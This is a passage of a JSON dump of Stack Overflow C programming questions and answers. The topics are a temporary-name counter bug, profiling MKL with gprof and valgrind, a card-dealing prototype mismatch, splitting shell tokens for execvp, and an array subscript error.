sprintf(s,\"T%d\",counter++);\n return(strdup(s));\n}\nmain()\n{\n char *s1;\n char *s2;\n char *s3;\n s1=CreateTemp();\n s2=CreateTemp();\n printf(\"Temp is %s\\n\",s1);\n printf(\"Temp is %s\\n\",s2);\n s3=CreateTemp();\n printf(\"Temp is %s\\n\",s3);\n}\n</code></pre>\n\n<p>Output:</p>\n\n<pre><code>Temp is T0  //Temp is T0\nTemp is T1  //Temp is T1\nTemp is T32600 //Temp is T2\n</code></pre>\n\n<p>I don't know why I got the output like this for T2? What is the reason?</p>\n\n<p>When I removed:</p>\n\n<p>int counter; // for counting temporaries</p>\n\n<p>...I got:</p>\n\n<pre><code>Temp is T0 \nTemp is T1 \nTemp is T2\n</code></pre>\n\n<p>Why, when I removed the specific line:</p>\n\n<pre><code>Int counter; / for counting temporaries\n</code></pre>\n\n<p>Did I get the correct result, but when I kept it I got confusing results for <code>T2</code>?</p>\n\n<p>Also, why when I add <code>static</code> to:</p>\n\n<pre><code>int counter; // for counting temporaries\n</code></pre>\n\n<p>To become:</p>\n\n<pre><code>static int counter; // for counting temporaries\n</code></pre>\n\n<p>And remove:</p>\n\n<pre><code>int counter; // global for counting input tokens\n</code></pre>\n\n<p>did I also got the correct result?</p>\n"}, {"tags": ["c", "profiling", "valgrind", "intel-mkl", "gprof"], "answers": [{"tags": [], "owner": {"reputation": 38606, "user_id": 23771, "user_type": "registered", "accept_rate": 60, "profile_image": "https://i.stack.imgur.com/NeuGc.jpg?s=128&g=1", "display_name": "Mike Dunlavey", "link": "https://stackoverflow.com/users/23771/mike-dunlavey"}, "is_accepted": false, "score": 0, "last_activity_date": 1447279073, "last_edit_date": 1492088034, "creation_date": 1447279073, "answer_id": 33660626, "question_id": 33656844, "link": "https://stackoverflow.com/questions/33656844/profiling-intel-mkl-functions-with-valgrind-and-gprof/33660626#33660626", "title": "Profiling intel mkl functions with valgrind and gprof", "body": "<p>I don't know about <em>valgrind</em>, but as you can see <em>gprof</em> is not going to give you useful information. For example, it looks like it spends a large fraction of time in error handling. Doing what? For what purpose?</p>\n\n<p><em>Maybe</em> it just goes in there and comes right out again, and your vectors are so small that processing them takes so little time that it's about the same as that error routine doing nothing.</p>\n\n<p><a href=\"https://scicomp.stackexchange.com/a/2719/1262\"><em>Here is a ton of discussion about things like that, and what to do about it.</em></a></p>\n"}], "owner": {"reputation": 3297, "user_id": 2546099, "user_type": "registered", "accept_rate": 73, "profile_image": "https://www.gravatar.com/avatar/3f7b2455429f817843ab8524d67f37a1?s=128&d=identicon&r=PG&f=1", "display_name": "arc_lupus", "link": "https://stackoverflow.com/users/2546099/arc-lupus"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 317, "favorite_count": 0, "answer_count": 1, "score": 1, "last_activity_date": 1447279073, "creation_date": 1447264749, "question_id": 33656844, "link": "https://stackoverflow.com/questions/33656844/profiling-intel-mkl-functions-with-valgrind-and-gprof", "title": "Profiling intel mkl functions with valgrind and gprof", "body": "<p>I want to profile several different functions, and started therefore with two simple functions:</p>\n\n<pre><code>void expVec(const int a_len, const double *a, double *b)\n{\n    vdExp(a_len, a, b);//Using the vectorial exp-function from the mkl library\n}\n</code></pre>\n\n<p>and</p>\n\n<pre><code>void expVec_sample(const int len, const double *a, double *b)\n{\n    for(int i = 0; i &lt; len; i++)//Serial execution\n        b[i] = exp(a[i]);\n}\n</code></pre>\n\n<p>I call them with </p>\n\n<pre><code>for(int i = 0; i &lt; 10000; i++)\n{\n    expVec(len, a, c);\n    expVec_sample(len, a, b);\n}\n</code></pre>\n\n<p>and compile the program with </p>\n\n<pre><code>gcc-5 main.c speed_test.c -o main -I/opt/intel/mkl/include -pg -g -DMKL_ILP64 -mavx -msse4.2 -msse3 -msse2 -m64 -flto -march=native -funroll-loops -std=gnu99 -Wl,--start-group /opt/intel/compilers_and_libraries_2016.0.109/linux/mkl/lib/intel64/libmkl_intel_ilp64.a /opt/intel/compilers_and_libraries_2016.0.109/linux/mkl/lib/intel64/libmkl_core.a /opt/intel/compilers_and_libraries_2016.0.109/linux/mkl/lib/intel64/libmkl_sequential.a -Wl,--end-group -lpthread -lm -ldl -lfftw3 -lfftw3_threads\n</code></pre>\n\n<p>I am using most of the switches due to copy- and paste from another project (where I will ultimately use the results from the profiling).<br>\nNow I get (when trying to measure the performance of both functions) the result in gprof:</p>\n\n<pre><code>index % time    self  children    called     name\n                                                 &lt;spontaneous&gt;\n[1]     35.6    2.45    0.00                 mkl_vml_kernel_dError [1]\n-----------------------------------------------\n                                                 &lt;spontaneous&gt;\n[2]     33.4    2.29    0.00                 mkl_vml_kernel_dExp_E9HAynn [2]\n-----------------------------------------------\n                                                 &lt;spontaneous&gt;\n[3]     12.9    0.89    0.00                 mkl_vml_kernel_GetMode [3]\n-----------------------------------------------\n                0.64    0.00   10000/10000       main [5]\n[4]      9.3    0.64    0.00   10000         expVec_sample [4]\n-----------------------------------------------\n                                                 &lt;spontaneous&gt;\n[5]      9.3    0.00    0.64                 main [5]\n                0.64    0.00   10000/10000       expVec_sample [4]\n                0.00    0.00   10000/10000       expVec [9]\n                0.00    0.00       1/1           fill [10]\n-----------------------------------------------\n                                                 &lt;spontaneous&gt;\n[6]      7.0    0.48    0.00                 vdexp_cout_rare [6]\n-----------------------------------------------\n                                                 &lt;spontaneous&gt;\n[7]      1.4    0.10    0.00                 mkl_vml_kernel_SetMode [7]\n-----------------------------------------------\n                                                 &lt;spontaneous&gt;\n[8]      0.4    0.03    0.00                 mkl_vml_kernel_zError [8]\n-----------------------------------------------\n                0.00    0.00   10000/10000       main [5]\n[9]      0.0    0.00    0.00   10000         expVec [9]\n-----------------------------------------------\n                0.00    0.00       1/1           main [5]\n[10]     0.0    0.00    0.00       1         fill [10]\n-----------------------------------------------\n</code></pre>\n\n<p>which already shows me that error handling in the mkl takes a large amount of time. When I try to profile it with valgrind, I get:</p>\n\n<pre><code>==29598== valgrind: Unrecognised instruction at address 0x40ea75.\n==29598==    at 0x40EA75: mkl_vml_kernel_dExp_E9HAynn (in /home/roland/Dokumente/MA/gnlse/c-ext_test/speed_test/main)\n==29598==    by 0x40220D: vdExp (in /home/roland/Dokumente/MA/gnlse/c-ext_test/speed_test/main)\n==29598==    by 0x401D0B: expVec (speed_test.c:21)\n==29598==    by 0x401BC5: main (main.c:18)\n==29598== Your program just tried to execute an instruction that Valgrind\n==29598== did not recognise.  There are two possible reasons for this.\n==29598== 1. Your program has a bug and erroneously jumped to a non-code\n==29598==    location.  If you are running Memcheck and you just saw a\n==29598==    warning about a bad jump, it's probably your program's fault.\n==29598== 2. The instruction is legitimate but Valgrind doesn't handle it,\n==29598==    i.e. it's Valgrind's fault.  If you think this is the case or\n==29598==    you are not sure, please let us know and we'll try to fix it.\n==29598== Either way, Valgrind will now raise a SIGILL signal which will\n==29598== probably kill your program.\n==29598== \n==29598== Process terminating with default action of signal 4 (SIGILL)\n==29598==  Illegal opcode at address 0x40EA75\n==29598==    at 0x40EA75: mkl_vml_kernel_dExp_E9HAynn (in /home/roland/Dokumente/MA/gnlse/c-ext_test/speed_test/main)\n==29598==    by 0x40220D: vdExp (in /home/roland/Dokumente/MA/gnlse/c-ext_test/speed_test/main)\n==29598==    by 0x401D0B: expVec (speed_test.c:21)\n==29598==    by 0x401BC5: main (main.c:18)\n==29598== \n==29598== Events    : Ir\n==29598== Collected : 530647\n==29598== \n==29598== I   refs:      530,647\nUnvalid machine command (Memory dump written)\n</code></pre>\n\n<p>What generates those errors, and how can I profile both functions in a useful way?</p>\n"}, {"tags": ["c"], "comments": [{"owner": {"reputation": 77, "user_id": 3316118, "user_type": "registered", "profile_image": "https://graph.facebook.com/100002961481304/picture?type=large", "display_name": "UmAir_Xajid", "link": "https://stackoverflow.com/users/3316118/umair-xajid"}, "reply_to_user": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "edited": false, "score": 0, "creation_date": 1447264181, "post_id": 33656611, "comment_id": 55086542, "body": "too many arguments to function &#39;deal&#39;"}, {"owner": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "edited": false, "score": 0, "creation_date": 1447264204, "post_id": 33656611, "comment_id": 55086555, "body": "So what do you understand from this error?"}, {"owner": {"reputation": 77, "user_id": 3316118, "user_type": "registered", "profile_image": "https://graph.facebook.com/100002961481304/picture?type=large", "display_name": "UmAir_Xajid", "link": "https://stackoverflow.com/users/3316118/umair-xajid"}, "reply_to_user": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "edited": false, "score": 0, "creation_date": 1447264292, "post_id": 33656611, "comment_id": 55086609, "body": "that deal is having too many arguments lol but the problem is how do I solve it @EugeneSh."}, {"owner": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "edited": false, "score": 0, "creation_date": 1447264339, "post_id": 33656611, "comment_id": 55086641, "body": "A simple search on <code>deal</code> over the code reveals the source of the problem. Anyway, @Caleb have just done it for you."}, {"owner": {"reputation": 77, "user_id": 3316118, "user_type": "registered", "profile_image": "https://graph.facebook.com/100002961481304/picture?type=large", "display_name": "UmAir_Xajid", "link": "https://stackoverflow.com/users/3316118/umair-xajid"}, "reply_to_user": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "edited": false, "score": 0, "creation_date": 1447264645, "post_id": 33656611, "comment_id": 55086828, "body": "I&#39;ve solved the error but the thing is @Eugene Sh. that my main problem was to deal with the hands and then check whether they have same ranks or not , If they have same ranks Then Its a pocket pair ... Now I want to calculate the Odds of having a Pocket Pair ... After successfully dealing nine hands then 3 then 1 and 1 again then 9 again ... After that How many chances of Pocket Pair will it be there ?"}], "answers": [{"comments": [{"owner": {"reputation": 77, "user_id": 3316118, "user_type": "registered", "profile_image": "https://graph.facebook.com/100002961481304/picture?type=large", "display_name": "UmAir_Xajid", "link": "https://stackoverflow.com/users/3316118/umair-xajid"}, "edited": false, "score": 0, "creation_date": 1447264464, "post_id": 33656705, "comment_id": 55086727, "body": "running but deck is not dealing with the specific size of hand. Hey @Caleb I know am a newbie in C , but is their any other way out to do what I asked earlier."}, {"owner": {"reputation": 119716, "user_id": 643383, "user_type": "registered", "accept_rate": 79, "profile_image": "https://i.stack.imgur.com/uQ5JF.png?s=128&g=1", "display_name": "Caleb", "link": "https://stackoverflow.com/users/643383/caleb"}, "reply_to_user": {"reputation": 77, "user_id": 3316118, "user_type": "registered", "profile_image": "https://graph.facebook.com/100002961481304/picture?type=large", "display_name": "UmAir_Xajid", "link": "https://stackoverflow.com/users/3316118/umair-xajid"}, "edited": false, "score": 0, "creation_date": 1447264667, "post_id": 33656705, "comment_id": 55086839, "body": "You asked about a specific problem, and it sounds like my answer above solved the problem. You said that you want to collect your data by actually simulating the hands, so I&#39;m not sure what &quot;other way&quot; you&#39;re asking about. There are other ways to calculate the probability of a pocket pair, of course, but that&#39;s pretty well beyond the scope of this question."}, {"owner": {"reputation": 77, "user_id": 3316118, "user_type": "registered", "profile_image": "https://graph.facebook.com/100002961481304/picture?type=large", "display_name": "UmAir_Xajid", "link": "https://stackoverflow.com/users/3316118/umair-xajid"}, "edited": false, "score": 0, "creation_date": 1447264817, "post_id": 33656705, "comment_id": 55086920, "body": "What will be that probability I will try it myself but Where should I start?"}, {"owner": {"reputation": 119716, "user_id": 643383, "user_type": "registered", "accept_rate": 79, "profile_image": "https://i.stack.imgur.com/uQ5JF.png?s=128&g=1", "display_name": "Caleb", "link": "https://stackoverflow.com/users/643383/caleb"}, "reply_to_user": {"reputation": 77, "user_id": 3316118, "user_type": "registered", "profile_image": "https://graph.facebook.com/100002961481304/picture?type=large", "display_name": "UmAir_Xajid", "link": "https://stackoverflow.com/users/3316118/umair-xajid"}, "edited": false, "score": 0, "creation_date": 1447265039, "post_id": 33656705, "comment_id": 55087055, "body": "Probability is the number of desired outcomes divided by the number of possible outcomes, right? So you need to count or calculate the number of hands that include a pocket pair and divide by the total number of hands. But we&#39;re digressing into applied math here... if this is for a class, your instructor or TA can help you far better than I can."}, {"owner": {"reputation": 77, "user_id": 3316118, "user_type": "registered", "profile_image": "https://graph.facebook.com/100002961481304/picture?type=large", "display_name": "UmAir_Xajid", "link": "https://stackoverflow.com/users/3316118/umair-xajid"}, "edited": false, "score": 0, "creation_date": 1447265183, "post_id": 33656705, "comment_id": 55087149, "body": "I understand what probability is, I don&#39;t know Poker. and I guess you are right that I have to calculate the number of hands that include a pocket pair and divide the total number of hands."}, {"owner": {"reputation": 119716, "user_id": 643383, "user_type": "registered", "accept_rate": 79, "profile_image": "https://i.stack.imgur.com/uQ5JF.png?s=128&g=1", "display_name": "Caleb", "link": "https://stackoverflow.com/users/643383/caleb"}, "reply_to_user": {"reputation": 77, "user_id": 3316118, "user_type": "registered", "profile_image": "https://graph.facebook.com/100002961481304/picture?type=large", "display_name": "UmAir_Xajid", "link": "https://stackoverflow.com/users/3316118/umair-xajid"}, "edited": false, "score": 0, "creation_date": 1447265258, "post_id": 33656705, "comment_id": 55087196, "body": "In the meantime, if the answer above solved the immediate problem, please accept it so that your question doesn&#39;t appear unanswered."}, {"owner": {"reputation": 77, "user_id": 3316118, "user_type": "registered", "profile_image": "https://graph.facebook.com/100002961481304/picture?type=large", "display_name": "UmAir_Xajid", "link": "https://stackoverflow.com/users/3316118/umair-xajid"}, "edited": false, "score": 0, "creation_date": 1447265427, "post_id": 33656705, "comment_id": 55087294, "body": "Done @Caleb ... but I need to understand this thing How to do that ? How to calculate odds. Can you share any resources or anything which can be helpful."}, {"owner": {"reputation": 77, "user_id": 3316118, "user_type": "registered", "profile_image": "https://graph.facebook.com/100002961481304/picture?type=large", "display_name": "UmAir_Xajid", "link": "https://stackoverflow.com/users/3316118/umair-xajid"}, "reply_to_user": {"reputation": 119716, "user_id": 643383, "user_type": "registered", "accept_rate": 79, "profile_image": "https://i.stack.imgur.com/uQ5JF.png?s=128&g=1", "display_name": "Caleb", "link": "https://stackoverflow.com/users/643383/caleb"}, "edited": false, "score": 0, "creation_date": 1447265608, "post_id": 33656705, "comment_id": 55087397, "body": "Let us <a href=\"http://chat.stackoverflow.com/rooms/94841/discussion-between-umair-xajid-and-caleb\">continue this discussion in chat</a>."}], "tags": [], "owner": {"reputation": 119716, "user_id": 643383, "user_type": "registered", "accept_rate": 79, "profile_image": "https://i.stack.imgur.com/uQ5JF.png?s=128&g=1", "display_name": "Caleb", "link": "https://stackoverflow.com/users/643383/caleb"}, "is_accepted": true, "score": 1, "last_activity_date": 1447264275, "creation_date": 1447264275, "answer_id": 33656705, "question_id": 33656611, "link": "https://stackoverflow.com/questions/33656611/card-of-decks-making-a-deal-of-specific-size-c-language/33656705#33656705", "title": "Card of Decks Making a deal of specific size C Language", "body": "<p>Your prototype for <code>deal</code>:</p>\n\n<pre><code>void deal( const Card * const wDeck );\n</code></pre>\n\n<p>doesn't match the implementation:</p>\n\n<pre><code>void deal( const Card * const wDeck , int size)\n</code></pre>\n\n<p>or the way you call it:</p>\n\n<pre><code>deal( deck, 2);\n</code></pre>\n\n<p>Fix the prototype and the error should disappear.</p>\n"}], "owner": {"reputation": 77, "user_id": 3316118, "user_type": "registered", "profile_image": "https://graph.facebook.com/100002961481304/picture?type=large", "display_name": "UmAir_Xajid", "link": "https://stackoverflow.com/users/3316118/umair-xajid"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1578, "favorite_count": 1, "accepted_answer_id": 33656705, "answer_count": 1, "score": 0, "last_activity_date": 1447264487, "creation_date": 1447263980, "last_edit_date": 1447264487, "question_id": 33656611, "link": "https://stackoverflow.com/questions/33656611/card-of-decks-making-a-deal-of-specific-size-c-language", "title": "Card of Decks Making a deal of specific size C Language", "body": "<p>Hello Everyone I am having a problem here. </p>\n\n<p>My Problem is that I would like a program that makes a normal deck of cards,shuffles and randomly deal 9 hands(two cards)then 3 cards and 1 card and then 1 more card, then calculate how often you get a pocket pair(two cards of the same rank), this must be done through trial and error and tracking statistics while working. the pocket pair is from the 9 hands. </p>\n\n<p>Now for this purpose Here what I have done till now \n1. Create a deck of 52 Cards\n2. Shuffling a deck \n3. Dealing a card</p>\n\n<p>Now I am having a problem in my code it is showing error. What i want is that to deal 9 hands (two cards) I just want to deal (Inner loop to be of size 2 ) for 3 cards (Inner loop to be of size 3) and to deal one (Inner loop of size 1 ) But Its showing error that \"too many arguments in deal\".</p>\n\n<p>Here's the code</p>\n\n<pre><code>/* Fig. 10.3: cardShuffle.c\nThe card shuffling and dealing program using structures */\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;time.h&gt;\n\n/* card structure definition */               \nstruct card {                                 \n   const char *face; /* define pointer face */\n   const char *suit; /* define pointer suit */\n}; /* end structure card */                   \n\ntypedef struct card Card; /* new type name for struct card */\n\n/* prototypes */\nvoid fillDeck( Card * const wDeck, const char * wFace[], \n   const char * wSuit[] );\nvoid shuffle( Card * const wDeck );\nvoid deal( const Card * const wDeck );\n\nint main( void )\n{ \n   Card deck[ 52 ]; /* define array of Cards */\n\n   /* initialize array of pointers */\n   const char *face[] = { \"Ace\", \"Deuce\", \"Three\", \"Four\", \"Five\",\n      \"Six\", \"Seven\", \"Eight\", \"Nine\", \"Ten\",\n      \"Jack\", \"Queen\", \"King\"};\n\n   /* initialize array of pointers */\n   const char *suit[] = { \"Hearts\", \"Diamonds\", \"Clubs\", \"Spades\"};\n\n   srand( time( NULL ) ); /* randomize */\n\n   fillDeck( deck, face, suit ); /* load the deck with Cards */\n   shuffle( deck ); /* put Cards in random order */\n   deal( deck, 2); /* deal all 52 Cards */\n\n   return 0; /* indicates successful termination */\n\n} /* end main */\n\n/* place strings into Card structures */\nvoid fillDeck( Card * const wDeck, const char * wFace[], \n   const char * wSuit[] )\n{ \n   int i; /* counter */\n\n   /* loop through wDeck */\n   for ( i = 0; i &lt;= 51; i++ ) { \n      wDeck[ i ].face = wFace[ i % 13 ];\n      wDeck[ i ].suit = wSuit[ i / 13 ];\n   } /* end for */\n\n} /* end function fillDeck */\n\n/* shuffle cards */\nvoid shuffle( Card * const wDeck )\n{ \n   int i;     /* counter */\n   int j;     /* variable to hold random value between 0 - 51 */\n   Card temp; /* define temporary structure for swapping Cards */\n\n   /* loop through wDeck randomly swapping Cards */\n   for ( i = 0; i &lt;= 51; i++ ) { \n      j = rand() % 52;\n      temp = wDeck[ i ];      \n      wDeck[ i ] = wDeck[ j ];\n      wDeck[ j ] = temp;      \n   } /* end for */\n\n} /* end function shuffle */\n\n/* deal cards */\nvoid deal( const Card * const wDeck , int size)\n{ \n   int i; /* counter */\n\n   /* loop through wDeck */\n   for ( i = 0; i &lt;= size; i++ ) {\n      printf( \"%5s of %-8s%c\", wDeck[ i ].face, wDeck[ i ].suit,( i + 1 ) % 2 ? '\\t' : '\\n' );\n   } /* end for */\n\n} /* end function deal */\n</code></pre>\n\n<p>Please Tell me What is the problem how it can be solved. and share your logic how main problem can be achieved.  Thanks </p>\n"}, {"tags": ["c", "arrays", "pointers", "token"], "comments": [{"owner": {"reputation": 199706, "user_id": 1566221, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/ce3ea4ffd1023d4382f397312352726d?s=128&d=identicon&r=PG", "display_name": "rici", "link": "https://stackoverflow.com/users/1566221/rici"}, "edited": false, "score": 2, "creation_date": 1447264973, "post_id": 33656572, "comment_id": 55087021, "body": "You only get memory leaks if you don&#39;t free what you&#39;ve allocated. So make sure that every allocation is matched with a free. That&#39;s independent of the logic of your program. To simplify the logic of your program, write some functions: the simplest way to make code easy to read and write is to make common operations independent functions. For example, a function which adds a string to an array of strings."}, {"owner": {"reputation": 657, "user_id": 5440452, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/609964d12cea609c4df487ccd4ae1f73?s=128&d=identicon&r=PG&f=1", "display_name": "hexasoft", "link": "https://stackoverflow.com/users/5440452/hexasoft"}, "edited": false, "score": 0, "creation_date": 1447266148, "post_id": 33656572, "comment_id": 55087743, "body": "whatever, if your tokens are (let set) <code>{&quot;ls&quot;, &quot;-l&quot;, &quot;|&quot;, &quot;sort&quot;, NULL}</code> what is complicated? Just loop on the elements until you reach a &quot;|&quot;, a &quot;&lt;&quot; or a &quot;&gt;&quot;. You will have to create a table of tables of tables, whatever (one for each token1, token2\u2026, with inside one for each token, with inside the char*)."}, {"owner": {"reputation": 657, "user_id": 5440452, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/609964d12cea609c4df487ccd4ae1f73?s=128&d=identicon&r=PG&f=1", "display_name": "hexasoft", "link": "https://stackoverflow.com/users/5440452/hexasoft"}, "edited": false, "score": 0, "creation_date": 1447266218, "post_id": 33656572, "comment_id": 55087785, "body": "note that your code will not work if you don&#39;t put spaces beetween &quot;|&quot;/&quot;&lt;&quot;/&quot;&gt;&quot; (i.e. &quot;ls -l |sort&quot;, where the last token will be &quot;|sort&quot;)."}, {"owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "edited": false, "score": 0, "creation_date": 1447266476, "post_id": 33656572, "comment_id": 55087944, "body": "when <code>realloc()</code> fails, this line: <code>argumentlist = realloc(argumentlist, bufsize * sizeof(char*));</code> overlays the prior pointer with a NULL, resulting in a memory leak.  Before calling <code>exit()</code>, need to cleanup by passing allocated memory to <code>free()</code>, closing any open file descriptors, etc"}, {"owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "edited": false, "score": 0, "creation_date": 1447266561, "post_id": 33656572, "comment_id": 55088012, "body": "what is <code>SP_BUFSIZE</code>?   Perhaps you meant: <code>BUFSIZE</code>."}, {"owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "edited": false, "score": 0, "creation_date": 1447266659, "post_id": 33656572, "comment_id": 55088076, "body": "the memory allocation performed by <code>getline()</code> also needs to be passed to <code>free()</code> before calling <code>exit()</code>"}, {"owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "edited": false, "score": 0, "creation_date": 1447267202, "post_id": 33656572, "comment_id": 55088445, "body": "regarding the generation of the new arrays for the commands,  Perhaps you need to ask:  do I actually need to break the line into tokens?  and what happens when the user input is: <code>ls -al&gt;newfile</code> or <code>ls    -al    &gt;   newfile</code> or ` echo &quot;alpha - betta&quot;` or similar.   In other words, the current method of breaking the line into tokens does not work correctly for all cases.   A usable tokenizer needs to parse the input char by char, with a number of &#39;states&#39; that indicate if in a token (and what kind of token) or just in some white space between tokens"}], "owner": {"reputation": 13, "user_id": 5551558, "user_type": "registered", "profile_image": "https://graph.facebook.com/10156178680595696/picture?type=large", "display_name": "Stefan", "link": "https://stackoverflow.com/users/5551558/stefan"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 119, "favorite_count": 0, "answer_count": 0, "score": 0, "last_activity_date": 1447264399, "creation_date": 1447263817, "last_edit_date": 1447264399, "question_id": 33656572, "link": "https://stackoverflow.com/questions/33656572/c-split-tokens-into-several-arrays-of-token", "title": "C - Split tokens into several arrays of token", "body": "<p>I spent quite at time thinking about this problem but haven't found an answer yet. I had some solutions but they all generated memory leaks....</p>\n\n<p>I have these functions:</p>\n\n<pre><code>char *read_line(void)\n{\n  char *line = NULL;\n  size_t bufsize = 0; \n  getline(&amp;line, &amp;bufsize, stdin);\n  return line;\n\n}\n\n#define BUFSIZE 64\n#define DELIM \" \\t\\r\\n\\a\" \nchar **split_line(char *line)\n{\n  int bufsize = BUFSIZE;\n  int position = 0;\n  char **argumentlist = malloc(bufsize * sizeof(char*));\n  char *argument;\n\n  if (!argumentlist) {\n    fprintf(stderr, \"allocation error\\n\");\n    exit(EXIT_FAILURE);\n  }\n\n  argument = strtok(line, DELIM);\n  while (argument != NULL) \n  {\n    argumentlist[position] = argument;\n    position++;\n\n    if (position &gt;= bufsize) \n    {\n      bufsize += SP_BUFSIZE;\n      argumentlist = realloc(argumentlist, bufsize * sizeof(char*));\n      if (!argumentlist) \n      {\n        fprintf(stderr, \"allocation error\\n\");\n        exit(EXIT_FAILURE);\n      }\n    }\n\n    argument = strtok(NULL, DELIM);\n  }\n\n  argumentlist[position] = NULL; //null terminates list of arguments\n\n  return argumentlist; //array of arguments\n}\n</code></pre>\n\n<p>So i have now a array with tokens. The problem is now that I want to split this array of tokens into smaller arrays for using shell commands. For example if somebody types: \"ls -l | sort\" I need two arrays; one with the tokens: \"ls -l NULL\" and the other one with \"sort NULL\" ==></p>\n\n<pre><code>token1[0] = ls\ntoken1[1] = -l\ntoken1[2] = NULL\n\ntoken2[0] = sort\ntoken2[1] = NULL\n</code></pre>\n\n<p>I need these arrays for the execvp command. Or if someone types: \"ls -l &lt; test.txt > hello.txt\" i should get the two arrays with the token: \"ls -l NULL\" and \"test.txt hello.txt NULL\". So I want to make a function which takes a char** and creates token arrays by looking for \">\" \"&lt;\" or \"|\" as delimeters. </p>\n\n<p>I hope this unterstandable, I'm really kind of stuck I don't know how to move on without generating memory leaks. </p>\n"}, {"tags": ["c", "expression"], "answers": [{"comments": [{"owner": {"reputation": 31, "user_id": 5441129, "user_type": "registered", "profile_image": "https://graph.facebook.com/10205235204339939/picture?type=large", "display_name": "Coralina", "link": "https://stackoverflow.com/users/5441129/coralina"}, "edited": false, "score": 0, "creation_date": 1447264151, "post_id": 33656583, "comment_id": 55086520, "body": "Thanks, totally didnt think of it!!!"}, {"owner": {"reputation": 14429, "user_id": 3494013, "user_type": "registered", "accept_rate": 95, "profile_image": "https://www.gravatar.com/avatar/ff6b6de2f59471e271413f74921e054a?s=128&d=identicon&r=PG&f=1", "display_name": "cadaniluk", "link": "https://stackoverflow.com/users/3494013/cadaniluk"}, "reply_to_user": {"reputation": 31, "user_id": 5441129, "user_type": "registered", "profile_image": "https://graph.facebook.com/10205235204339939/picture?type=large", "display_name": "Coralina", "link": "https://stackoverflow.com/users/5441129/coralina"}, "edited": false, "score": 0, "creation_date": 1448193756, "post_id": 33656583, "comment_id": 55473196, "body": "@Coralina Please accept an answer to mark this problem as solved."}], "tags": [], "owner": {"reputation": 14429, "user_id": 3494013, "user_type": "registered", "accept_rate": 95, "profile_image": "https://www.gravatar.com/avatar/ff6b6de2f59471e271413f74921e054a?s=128&d=identicon&r=PG&f=1", "display_name": "cadaniluk", "link": "https://stackoverflow.com/users/3494013/cadaniluk"}, "is_accepted": true, "score": 1, "last_activity_date": 1447263851, "creation_date": 1447263851, "answer_id": 33656583, "question_id": 33656566, "link": "https://stackoverflow.com/questions/33656566/unknown-error-causes-in-function-expected-expression/33656583#33656583", "title": "Unknown error causes in function @@ &quot;expected expression&quot;", "body": "<p>The <code>[]</code> square brackets form the <em>subscript operator</em>, which expects <strong>an argument</strong> to index the object it is called on.</p>\n\n<p>Instead, use <code>arv[i]</code> to get the <code>i</code><sup>th</sup> element of <code>arv</code>.</p>\n"}], "owner": {"reputation": 31, "user_id": 5441129, "user_type": "registered", "profile_image": "https://graph.facebook.com/10205235204339939/picture?type=large", "display_name": "Coralina", "link": "https://stackoverflow.com/users/5441129/coralina"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 54, "favorite_count": 0, "closed_date": 1447269991, "accepted_answer_id": 33656583, "answer_count": 1, "score": -1, "last_activity_date": 1447263979, "creation_date": 1447263792, "last_edit_date": 1447263979, "question_id": 33656566, "link": "https://stackoverflow.com/questions/33656566/unknown-error-causes-in-function-expected-expression", "closed_reason": "Not suitable for this site", "title": "Unknown error causes in function @@ &quot;expected expression&quot;", "body": "<p>Im in a bit of a trouble calling out and making functions and their prototypes. Can anyone validate and give tips given function with prototype?</p>\n\n<p>prototype: <code>int sumpa(int sum, int arv[])</code></p>\n\n<p>function call-out: <code>sumpa(sum, arv);</code></p>\n\n<p>function:</p>\n\n<pre><code>int sumpa(int sum, int arv[])\n{\nint i;\ni=0;\n\nfor (i=0; 